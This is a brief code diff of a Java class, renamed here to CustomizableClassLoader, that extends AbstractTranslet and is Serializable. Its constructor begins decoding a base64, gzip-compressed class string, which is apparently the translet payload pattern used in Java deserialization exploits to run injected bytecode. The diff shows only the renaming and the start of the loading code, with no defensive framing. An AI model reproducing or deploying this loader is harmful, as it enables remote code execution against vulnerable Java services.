@@ -14,11 +14,14 @@ import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.zip.GZIPInputStream;
 
-public class RunClassLoader  extends AbstractTranslet implements Serializable {
+/**
+ * file
+ */
+public class CustomizableClassLoader extends AbstractTranslet implements Serializable {
 
     private static String classBae64Str = null;
 
-    public RunClassLoader(){
+    public CustomizableClassLoader(){
         try {
             transletVersion = 101;
             GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(classBae64Str.getBytes())));
